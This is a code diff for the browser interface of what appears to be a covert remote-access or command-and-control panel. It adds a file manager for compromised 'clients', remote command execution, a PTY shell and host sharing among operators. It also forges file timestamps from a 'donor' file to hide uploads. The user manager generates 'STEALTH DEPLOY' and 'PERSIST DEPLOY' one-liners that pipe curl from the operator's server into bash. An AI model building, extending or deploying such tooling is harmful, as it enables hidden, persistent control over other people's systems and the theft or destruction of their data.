+    const u=parseInt(numeric[0])||0,g=parseInt(numeric[1])||0,o=parseInt(numeric[2])||0;
+    document.getElementById('chmod-ur').checked=(u&4)>0;
+    document.getElementById('chmod-uw').checked=(u&2)>0;
+    document.getElementById('chmod-ux').checked=(u&1)>0;
+    document.getElementById('chmod-gr').checked=(g&4)>0;
+    document.getElementById('chmod-gw').checked=(g&2)>0;
+    document.getElementById('chmod-gx').checked=(g&1)>0;
+    document.getElementById('chmod-or').checked=(o&4)>0;
+    document.getElementById('chmod-ow').checked=(o&2)>0;
+    document.getElementById('chmod-ox').checked=(o&1)>0;
+}
+
+function fmUpdateChmodNumeric(){
+    let u=0,g=0,o=0;
+    if(document.getElementById('chmod-ur').checked)u+=4;
+    if(document.getElementById('chmod-uw').checked)u+=2;
+    if(document.getElementById('chmod-ux').checked)u+=1;
+    if(document.getElementById('chmod-gr').checked)g+=4;
+    if(document.getElementById('chmod-gw').checked)g+=2;
+    if(document.getElementById('chmod-gx').checked)g+=1;
+    if(document.getElementById('chmod-or').checked)o+=4;
+    if(document.getElementById('chmod-ow').checked)o+=2;
+    if(document.getElementById('chmod-ox').checked)o+=1;
+    document.getElementById('chmod-numeric').value=''+u+g+o;
+}
+
+async function fmApplyChmod(){
+    if(!fmChmodFile)return;
+    const mode=document.getElementById('chmod-numeric').value;
+    const path=fmCurrentPath.endsWith('/')?fmCurrentPath+fmChmodFile:fmCurrentPath+'/'+fmChmodFile;
+    
+    fmStatus('Changing permissions...');
+    try{
+        const r=await fetch(`/api/clients/${selected}/files/chmod`,{
+            method:'POST',
+            headers:{'Content-Type':'application/json'},
+            body:JSON.stringify({path:path,mode:mode})
+        });
+        const data=await r.json();
+        if(data.error){
+            fmStatus(data.error,true);
+            return;
+        }
+        fmCloseChmod();
+        fmStatus('Permissions changed: '+fmChmodFile);
+        fmRefresh();
+    }catch(e){
+        fmStatus('Error: '+e.message,true);
+    }
+}
+
+function fmCopy(name){
+    fmClipboard=fmCurrentPath.endsWith('/')?fmCurrentPath+name:fmCurrentPath+'/'+name;
+    fmClipboardOp='copy';
+    document.getElementById('fm-paste-btn').style.display='inline-flex';
+    fmStatus('Copied to clipboard: '+name);
+}
+
+function fmTouchPrompt(name){
+    fmTouchFile=name;
+    document.getElementById('fm-touch-target-name').textContent=name;
+    document.querySelector('input[name="touch-mode"][value="now"]').checked=true;
+    document.getElementById('fm-touch-donor-section').style.display='none';
+    document.getElementById('fm-touch-donor-path').value='';
+    
+    const donorSelect=document.getElementById('fm-touch-donor');
+    donorSelect.innerHTML='<option value="">-- Select file/folder --</option>';
+    fmFiles.filter(f=>f.name!==name).forEach(f=>{
+        const opt=document.createElement('option');
+        opt.value=fmCurrentPath.endsWith('/')?fmCurrentPath+f.name:fmCurrentPath+'/'+f.name;
+        opt.textContent=(f.is_dir?'📁 ':'📄 ')+f.name+' ('+f.mtime+')';
+        donorSelect.appendChild(opt);
+    });
+    
+    document.getElementById('fm-touch-modal').style.display='flex';
+}
+
+function fmCloseTouch(){
+    fmTouchFile=null;
+    document.getElementById('fm-touch-modal').style.display='none';
+}
+
+function fmTouchModeChange(){
+    const mode=document.querySelector('input[name="touch-mode"]:checked').value;
+    document.getElementById('fm-touch-donor-section').style.display=mode==='donor'?'block':'none';
+}
+
+async function fmApplyTouch(){
+    if(!fmTouchFile)return;
+    const mode=document.querySelector('input[name="touch-mode"]:checked').value;
+    
+    let donor='';
+    if(mode==='donor'){
+        donor=document.getElementById('fm-touch-donor-path').value||document.getElementById('fm-touch-donor').value;
+        if(!donor){
+            alert('Please select or enter a donor file/folder path');
+            return;
+        }
+    }
+    
+    const files=fmTouchFile.includes(',')?fmTouchFile.split(','):[fmTouchFile];
+    fmStatus('Updating timestamp for '+files.length+' item(s)...');
+    
+    try{
+        for(const name of files){
+            const path=fmCurrentPath.endsWith('/')?fmCurrentPath+name:fmCurrentPath+'/'+name;
+            await fetch(`/api/clients/${selected}/files/touch`,{
+                method:'POST',
+                headers:{'Content-Type':'application/json'},
+                body:JSON.stringify({path:path,donor:donor})
+            });
+        }
+        fmCloseTouch();
+        fmSelectedFiles=[];
+        fmUpdateBulkActions();
+        fmStatus('Timestamp updated: '+files.length+' item(s)'+(donor?' (from donor)':''));
+        fmRefresh();
+    }catch(e){
+        fmStatus('Error: '+e.message,true);
+    }
+}
+
+async function fmArchive(name){
+    if(!selected)return;
+    const path=fmCurrentPath.endsWith('/')?fmCurrentPath+name:fmCurrentPath+'/'+name;
+    const archivePath=path+'.tar.gz';
+    fmStatus('Creating archive...');
+    try{
+        const r=await fetch(`/api/clients/${selected}/files/archive`,{
+            method:'POST',
+            headers:{'Content-Type':'application/json'},
+            body:JSON.stringify({action:'create',path:path,archive_path:archivePath})
+        });
+        const data=await r.json();
+        if(data.error){
+            fmStatus(data.error,true);
+            return;
+        }
+        fmStatus('Archive created: '+name+'.tar.gz');
+        fmRefresh();
+    }catch(e){
+        fmStatus('Error: '+e.message,true);
+    }
+}
+
+async function fmExtract(name){
+    if(!selected)return;
+    const path=fmCurrentPath.endsWith('/')?fmCurrentPath+name:fmCurrentPath+'/'+name;
+    fmStatus('Extracting archive...');
+    try{
+        const r=await fetch(`/api/clients/${selected}/files/archive`,{
+            method:'POST',
+            headers:{'Content-Type':'application/json'},
+            body:JSON.stringify({action:'extract',path:path,archive_path:fmCurrentPath})
+        });
+        const data=await r.json();
+        if(data.error){
+            fmStatus(data.error,true);
+            return;
+        }
+        fmStatus('Archive extracted: '+name);
+        fmRefresh();
+    }catch(e){
+        fmStatus('Error: '+e.message,true);
+    }
+}
+
+async function fmPaste(){
+    if(!fmClipboard)return;
+    const filename=fmClipboard.split('/').pop();
+    const dst=fmCurrentPath.endsWith('/')?fmCurrentPath+filename:fmCurrentPath+'/'+filename;
+    
+    fmStatus(fmClipboardOp==='copy'?'Copying...':'Moving...');
+    try{
+        const endpoint=fmClipboardOp==='copy'?'copy':'move';
+        const r=await fetch(`/api/clients/${selected}/files/${endpoint}`,{
+            method:'POST',
+            headers:{'Content-Type':'application/json'},
+            body:JSON.stringify({src:fmClipboard,dst:dst})
+        });
+        const data=await r.json();
+        if(data.error){
+            fmStatus(data.error,true);
+            return;
+        }
+        fmStatus((fmClipboardOp==='copy'?'Copied':'Moved')+': '+filename);
+        if(fmClipboardOp==='move')fmClipboard=null;
+        fmRefresh();
+    }catch(e){
+        fmStatus('Error: '+e.message,true);
+    }
+}
+
+function fmUpload(){
+    document.getElementById('fm-upload-input').click();
+}
+
+function fmShowUploadModal(files){
+    if(!files||!files.length)return;
+    fmUploadFiles=files;
+    document.getElementById('fm-upload-count').textContent=files.length+' file(s) selected';
+    document.querySelector('input[name="upload-ts-mode"][value="now"]').checked=true;
+    document.getElementById('fm-upload-donor-section').style.display='none';
+    fmPopulateDonorSelect('fm-upload-donor');
+    document.getElementById('fm-upload-modal').style.display='flex';
+}
+
+function fmCloseUpload(){
+    fmUploadFiles=null;
+    document.getElementById('fm-upload-modal').style.display='none';
+    document.getElementById('fm-upload-input').value='';
+}
+
+function fmUploadTsModeChange(){
+    const mode=document.querySelector('input[name="upload-ts-mode"]:checked').value;
+    document.getElementById('fm-upload-donor-section').style.display=mode==='donor'?'block':'none';
+}
+
+async function fmDoUpload(files){
+    fmShowUploadModal(files);
+}
+
+async function fmDoUploadWithTs(){
+    if(!fmUploadFiles||!fmUploadFiles.length)return;
+    
+    const tsMode=document.querySelector('input[name="upload-ts-mode"]:checked').value;
+    const donor=tsMode==='donor'?document.getElementById('fm-upload-donor').value:'';
+    
+    fmStatus('Uploading '+fmUploadFiles.length+' file(s)...');
+    const uploadedPaths=[];
+    
+    try{
+        for(const file of fmUploadFiles){
+            const formData=new FormData();
+            formData.append('file',file);
+            formData.append('path',fmCurrentPath);
+            
+            const r=await fetch(`/api/clients/${selected}/files/upload`,{
+                method:'POST',
+                body:formData
+            });
+            const data=await r.json();
+            if(!data.error){
+                const filePath=fmCurrentPath.endsWith('/')?fmCurrentPath+file.name:fmCurrentPath+'/'+file.name;
+                uploadedPaths.push(filePath);
+            }
+        }
+        
+        if(donor&&uploadedPaths.length>0){
+            for(const path of uploadedPaths){
+                await fetch(`/api/clients/${selected}/files/touch`,{
+                    method:'POST',
+                    headers:{'Content-Type':'application/json'},
+                    body:JSON.stringify({path:path,donor:donor})
+                });
+            }
+        }
+        
+        fmCloseUpload();
+        fmStatus('Uploaded '+uploadedPaths.length+' file(s)');
+        fmRefresh();
+    }catch(e){
+        fmStatus('Error: '+e.message,true);
+    }
+}
+
+async function fmDownload(name){
+    if(!selected)return;
+    const path=fmCurrentPath.endsWith('/')?fmCurrentPath+name:fmCurrentPath+'/'+name;
+    fmStatus('Downloading: '+name+'...');
+    try{
+        const r=await fetch(`/api/clients/${selected}/files/download`,{
+            method:'POST',
+            headers:{'Content-Type':'application/json'},
+            body:JSON.stringify({path:path})
+        });
+        if(!r.ok){
+            const data=await r.json();
+            fmStatus(data.error||'Download failed',true);
+            return;
+        }
+        const blob=await r.blob();
+        const url=URL.createObjectURL(blob);
+        const a=document.createElement('a');
+        a.href=url;
+        a.download=name;
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        URL.revokeObjectURL(url);
+        fmStatus('Downloaded: '+name);
+    }catch(e){
+        fmStatus('Error: '+e.message,true);
+    }
+}
+
+function fmSelectAll(checked){
+    document.querySelectorAll('.fm-checkbox').forEach(cb=>{cb.checked=checked;});
+    fmSelectedFiles=checked?fmFiles.map(f=>f.name):[];
+    fmUpdateBulkActions();
+}
+
+function fmToggleSelect(idx,checked){
+    const name=fmFiles[idx].name;
+    if(checked){
+        if(!fmSelectedFiles.includes(name))fmSelectedFiles.push(name);
+    }else{
+        fmSelectedFiles=fmSelectedFiles.filter(n=>n!==name);
+    }
+    fmUpdateBulkActions();
+}
+
+function fmUpdateBulkActions(){
+    const count=fmSelectedFiles.length;
+    const el=document.getElementById('fm-bulk-actions');
+    if(count>0){
+        el.style.display='flex';
+        document.getElementById('fm-selected-count').textContent=count+' selected';
+    }else{
+        el.style.display='none';
+    }
+}
+
+async function fmBulkDownload(){
+    const files=fmSelectedFiles.filter(n=>!fmFiles.find(f=>f.name===n&&f.is_dir));
+    if(files.length===0){alert('Select files to download (not folders)');return;}
+    fmStatus('Downloading '+files.length+' files...');
+    for(const name of files){
+        await fmDownload(name);
+    }
+    fmStatus('Download complete');
+}
+
+async function fmBulkDelete(){
+    if(fmSelectedFiles.length===0)return;
+    if(!confirm('Delete '+fmSelectedFiles.length+' items?'))return;
+    fmStatus('Deleting '+fmSelectedFiles.length+' items...');
+    for(const name of fmSelectedFiles){
+        const path=fmCurrentPath.endsWith('/')?fmCurrentPath+name:fmCurrentPath+'/'+name;
+        await fetch(`/api/clients/${selected}/files/delete`,{
+            method:'POST',
+            headers:{'Content-Type':'application/json'},
+            body:JSON.stringify({path:path})
+        });
+    }
+    fmSelectedFiles=[];
+    fmUpdateBulkActions();
+    fmRefresh();
+    fmStatus('Deleted');
+}
+
+async function fmBulkArchive(){
+    if(fmSelectedFiles.length===0)return;
+    const archiveName=prompt('Archive name:','archive.zip');
+    if(!archiveName)return;
+    const archivePath=fmCurrentPath.endsWith('/')?fmCurrentPath+archiveName:fmCurrentPath+'/'+archiveName;
+    const files=fmSelectedFiles.map(n=>fmCurrentPath.endsWith('/')?fmCurrentPath+n:fmCurrentPath+'/'+n);
+    fmStatus('Creating archive...');
+    const cmd='cd '+fmCurrentPath.replace(/'/g,"'\\''")+" && zip -r '"+archiveName.replace(/'/g,"'\\''")+'\' '+fmSelectedFiles.map(n=>"'"+n.replace(/'/g,"'\\''")+"'").join(' ');
+    await fetch(`/api/clients/${selected}/exec`,{
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({cmd:cmd})
+    });
+    fmSelectedFiles=[];
+    fmUpdateBulkActions();
+    setTimeout(()=>fmRefresh(),500);
+    fmStatus('Archive created: '+archiveName);
+}
+
+function fmBulkTouch(){
+    if(fmSelectedFiles.length===0)return;
+    fmTouchFile=fmSelectedFiles.join(',');
+    document.getElementById('fm-touch-target-name').textContent=fmSelectedFiles.length+' files';
+    const donorSelect=document.getElementById('fm-touch-donor');
+    donorSelect.innerHTML='<option value="">-- Select file/folder --</option>';
+    fmFiles.forEach(f=>{
+        const opt=document.createElement('option');
+        opt.value=f.name;
+        opt.textContent=(f.is_dir?'📁 ':'📄 ')+f.name+' ('+f.mtime+')';
+        donorSelect.appendChild(opt);
+    });
+    document.getElementById('fm-touch-donor-path').value='';
+    document.getElementById('fm-touch-modal').style.display='flex';
+    fmTouchModeChange();
+}
+
+document.querySelectorAll('#fm-chmod-modal input[type="checkbox"]').forEach(cb=>{
+    cb.addEventListener('change',fmUpdateChmodNumeric);
+});
+
+document.addEventListener('keydown',e=>{
+    if(fmMode&&e.ctrlKey&&e.key==='v')fmPaste();
+});
 
 function connectClient(){
     if(!selected)return;
@@ -232,12 +1340,14 @@ function togglePty(){
 }
 
 function openPty(){
+    if(fmMode){fmMode=false;}
     ptyMode=true;
-    document.getElementById('term-output').style.display='none';
-    document.getElementById('term-input-row').style.display='none';
+    hideAllModes();
     document.getElementById('xterm-container').style.display='block';
     document.getElementById('btn-pty').textContent='CLOSE PTY';
     document.getElementById('btn-pty').classList.add('btn-green');
+    document.getElementById('btn-files').textContent='FILES';
+    document.getElementById('btn-files').classList.remove('btn-green');
     
     if(!term){
         term=new Terminal({cursorBlink:true,theme:{background:'#2e3440',foreground:'#eceff4',cursor:'#88c0d0'}});
@@ -254,13 +1364,9 @@ function openPty(){
 
 function closePty(){
     ptyMode=false;
-    document.getElementById('term-output').style.display='block';
-    document.getElementById('term-input-row').style.display='flex';
-    document.getElementById('xterm-container').style.display='none';
-    document.getElementById('btn-pty').textContent='PTY MODE';
-    document.getElementById('btn-pty').classList.remove('btn-green');
     if(ptySessionId){socket.emit('pty_close',{session_id:ptySessionId});ptySessionId=null;}
     if(term)term.clear();
+    showTerminalMode();
 }
 
 function showResult(data){
@@ -282,13 +1388,32 @@ function showResult(data){
 function esc(t){const d=document.createElement('div');d.textContent=t;return d.innerHTML;}
 function clearTerm(){document.getElementById('term-output').innerHTML='';}
 function execCmd(cmd){if(!selected||!cmd)return;fetch(`/api/clients/${selected}/exec`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cmd})});}
-function broadcast(){
-    const cmd=document.getElementById('broadcast-cmd').value;
-    if(!cmd)return;
-    fetch('/api/broadcast',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cmd})}).then(r=>r.json()).then(d=>{
-        alert(`Sent: ${d.sent}, Queued: ${d.queued}`);
-        document.getElementById('broadcast-cmd').value='';
-    });
+let hostsCollapsed=false;
+function toggleHostsPanel(){
+    hostsCollapsed=!hostsCollapsed;
+    const main=document.querySelector('.main');
+    const title=document.getElementById('hosts-title');
+    const toggle=document.getElementById('hosts-toggle');
+    if(hostsCollapsed){
+        main.classList.add('hosts-collapsed');
+        title.textContent='H';
+        toggle.textContent='>';
+    }else{
+        main.classList.remove('hosts-collapsed');
+        title.textContent='HOSTS';
+        toggle.textContent='<';
+    }
+}
+function toggleDeploy(){
+    const content=document.getElementById('deploy-content');
+    const arrow=document.getElementById('deploy-arrow');
+    if(content.style.display==='none'){
+        content.style.display='block';
+        arrow.textContent='▲';
+    }else{
+        content.style.display='none';
+        arrow.textContent='▼';
+    }
 }
 function copyCmd(id){
     const t=document.getElementById(id).textContent;
@@ -297,7 +1422,147 @@ function copyCmd(id){
     const b=event.target;b.textContent='COPIED';b.style.background='var(--green)';setTimeout(()=>{b.textContent='COPY';b.style.background='';},1000);
 }
 document.getElementById('term-input').addEventListener('keypress',e=>{if(e.key==='Enter'){execCmd(e.target.value);e.target.value='';}});
-document.getElementById('broadcast-cmd').addEventListener('keypress',e=>{if(e.key==='Enter')broadcast();});
+
+// User management functions
+function updateUserTabs(){
+    const tabs=document.getElementById('user-tabs');
+    tabs.innerHTML='';
+    // Always add ADMIN tab first
+    const adminTab=document.createElement('div');
+    adminTab.className='user-tab'+(!currentUserId?' active':'');
+    adminTab.textContent='ADMIN';
+    adminTab.onclick=()=>switchUser('admin');
+    tabs.appendChild(adminTab);
+    // Add other users
+    usersData.forEach(u=>{
+        const tab=document.createElement('div');
+        tab.className='user-tab'+(u.id===currentUserId?' active':'');
+        tab.textContent=u.name.toUpperCase();
+        tab.onclick=()=>switchUser(u.id);
+        tabs.appendChild(tab);
+    });
+}
+
+function switchUser(userId){
+    if(userId==='admin'||userId===null){
+        localStorage.removeItem('view_as_user');
+        currentUserId=null;
+    }else{
+        localStorage.setItem('view_as_user',userId);
+        currentUserId=userId;
+    }
+    updateUserTabs();
+    refresh();
+}
+
+function createUser(){
+    const name=prompt('Enter username:');
+    if(!name)return;
+    fetch('/api/users',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({name:name}),credentials:'same-origin'})
+        .then(r=>r.json())
+        .then(d=>{if(d.id)refresh();else alert(d.error||'Failed');});
+}
+
+function shareHost(userId,clientId){
+    fetch(`/api/users/${userId}/share`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({client_id:clientId}),credentials:'same-origin'})
+        .then(r=>r.json())
+        .then(d=>{if(d.status==='shared')refresh();else alert(d.error);});
+}
+
+function unshareHost(userId,clientId){
+    fetch(`/api/users/${userId}/unshare`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({client_id:clientId}),credentials:'same-origin'})
+        .then(r=>r.json())
+        .then(d=>{if(d.status==='unshared'){renderUserManager();refresh();}else alert(d.error);});
+}
+
+function openUserManager(){
+    document.getElementById('user-manager-modal').style.display='flex';
+    renderUserManager();
+}
+
+function closeUserManager(){
+    document.getElementById('user-manager-modal').style.display='none';
+}
+
+function renderUserManager(){
+    const body=document.getElementById('user-manager-body');
+    if(usersData.length===0){
+        body.innerHTML='<div style="padding:30px;color:var(--fg-dim);text-align:center">No users created yet.<br><br><button onclick="createUser();renderUserManager()" style="padding:8px 16px;background:var(--green);border:none;color:#fff;border-radius:4px;cursor:pointer">+ Create User</button></div>';
+        return;
+    }
+    let html='';
+    usersData.forEach(u=>{
+        const sharedCount=u.shared_hosts?u.shared_hosts.length:0;
+        const port=u.port||'N/A';
+        const serverUrl=window.location.hostname;
+        const stealthCmd=`bash -c "$(curl -fsSL http://${serverUrl}:${port}/${u.stealth_path})"`;
+        const persistCmd=`bash -c "$(curl -fsSL http://${serverUrl}:${port}/${u.persist_path})"`;
+        html+=`<div style="background:var(--bg2);border-radius:6px;padding:16px;margin-bottom:12px">
+            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">
+                <div><strong style="font-size:14px;color:var(--accent)">${u.name}</strong><span style="margin-left:10px;font-size:10px;color:var(--fg-dim)">Port: ${port}</span></div>
+                <div>
+                    <button onclick="renameUser('${u.id}','${u.name}')" style="padding:4px 10px;background:var(--bg3);border:none;color:var(--fg);border-radius:3px;cursor:pointer;font-size:11px;margin-right:6px">Rename</button>
+                    <button onclick="deleteUser('${u.id}')" style="padding:4px 10px;background:var(--red);border:none;color:#fff;border-radius:3px;cursor:pointer;font-size:11px">Delete</button>
+                </div>
+            </div>
+            <div style="margin-bottom:10px">
+                <div style="font-size:10px;color:var(--fg-dim);margin-bottom:4px">ACCESS KEY:</div>
+                <div style="background:var(--bg1);padding:8px;border-radius:4px;font-size:11px;word-break:break-all;color:var(--yellow)">${u.key||'N/A'}</div>
+            </div>
+            <div style="margin-bottom:10px">
+                <div style="font-size:10px;color:var(--fg-dim);margin-bottom:4px">STEALTH DEPLOY:</div>
+                <div style="background:var(--bg1);padding:8px;border-radius:4px;font-size:10px;word-break:break-all;color:var(--green)">${stealthCmd}</div>
+            </div>
+            <div style="margin-bottom:10px">
+                <div style="font-size:10px;color:var(--fg-dim);margin-bottom:4px">PERSIST DEPLOY:</div>
+                <div style="background:var(--bg1);padding:8px;border-radius:4px;font-size:10px;word-break:break-all;color:var(--purple)">${persistCmd}</div>
+            </div>
+            <div>
+                <div style="font-size:10px;color:var(--fg-dim);margin-bottom:4px">SHARED HOSTS: ${sharedCount}</div>
+                <button onclick="manageShares('${u.id}')" style="padding:6px 12px;background:var(--bg3);border:none;color:var(--fg);border-radius:4px;cursor:pointer;font-size:11px">Manage Host Access</button>
+            </div>
+        </div>`;
+    });
+    body.innerHTML=html;
+}
+
+function renameUser(userId,currentName){
+    const newName=prompt('New username:',currentName);
+    if(!newName||newName===currentName)return;
+    fetch(`/api/users/${userId}`,{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify({name:newName}),credentials:'same-origin'})
+        .then(r=>r.json())
+        .then(d=>{if(d.status==='updated'){refresh();renderUserManager();}else alert(d.error||'Failed');});
+}
+
+function deleteUser(userId){
+    if(!confirm('Delete this user? This cannot be undone.'))return;
+    fetch(`/api/users/${userId}`,{method:'DELETE',credentials:'same-origin'})
+        .then(r=>r.json())
+        .then(d=>{if(d.status==='deleted'){refresh();renderUserManager();}else alert(d.error||'Failed');});
+}
+
+function manageShares(userId){
+    const user=usersData.find(u=>u.id===userId);
+    if(!user)return;
+    let msg='Shared hosts: '+(user.shared_hosts.length?user.shared_hosts.join(', '):'none')+'\n\n';
+    msg+='Available hosts:\n';
+    hostsData.forEach((h,i)=>{msg+=`${i+1}. ${h.hostname} (${h.ip})\n`;});
+    msg+='\nEnter host number to toggle share (or cancel):';
+    const choice=prompt(msg);
+    if(!choice)return;
+    const idx=parseInt(choice)-1;
+    if(idx>=0&&idx<hostsData.length){
+        const host=hostsData[idx];
+        const clientIds=host.channel_list.map(ch=>host.channels[ch].id);
+        const isShared=user.shared_hosts.some(id=>clientIds.includes(id));
+        if(isShared){
+            clientIds.forEach(cid=>{if(user.shared_hosts.includes(cid))unshareHost(userId,cid);});
+        }else{
+            clientIds.forEach(cid=>shareHost(userId,cid));
+        }
+    }
+}
+
 refresh();setInterval(refresh,5000);
 </script>
 </body>
